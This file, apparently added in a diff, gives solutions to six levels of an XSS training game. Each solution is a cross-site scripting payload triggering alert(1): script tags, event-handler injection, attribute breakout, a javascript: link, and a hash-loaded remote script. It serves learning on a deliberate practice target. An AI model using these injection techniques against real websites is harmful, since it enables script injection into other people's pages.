@@ -1,0 +1,38 @@
+# Solutions
+## Level 1
+Injecting html into the page due to the displaying of the search value.
+
+Search Query:
+```
+<script>alert(1);</script>
+```
+
+## Level 2
+Message:
+```
+<div onclick="alert(1);">#####</div>
+
+## Level 3
+```
+https://xss-game.appspot.com/level3/frame#'><div onclick='alert(1);'>click</div><img src='
+```
+
+## Level 4
+Timer Value
+```
+');alert('1
+```
+
+## Level 5
+Setting the `href` value
+Email Value:
+```
+javascript:alert(1)
+```
+
+## Level 6
+Setting the gadget uri by using 1. the hash and 2. `//` (use protocol of current server)
+Part after `/frame`:
+```
+#//google.com/jsapi?callback=alert
+```
